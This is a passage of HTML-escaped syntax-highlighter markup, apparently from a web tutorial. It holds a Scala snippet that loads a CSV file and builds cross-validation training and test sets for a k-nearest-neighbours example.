&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06132f102130773-67&quot;&gt;67&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06132f102130773-68&quot;&gt;68&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Unit&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/.../KNN_Example_1.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Define the amount of rounds, in our case 2 and &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//initialise the cross validation&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//在这第二种情况中我们设置了交叉验证的次数并初始化交叉验证&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;cv&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;CrossValidation&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;validationRounds&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-9&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testDataWithIndices&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;testData&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;zipWithIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;testData&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;zipWithIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingDPSets&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;cv&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;train&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;indexList&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;indexList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;testDataWithIndices&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-21&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingClassifierSets&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;cv&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;train&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;indexList&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;indexList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;testDataWithIndices&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testingDPSets&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;cv&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;indexList&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;indexList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;testDataWithIndices&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-31&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testingClassifierSets&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;cv&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;indexList&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;indexList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-34&quot;&gt;
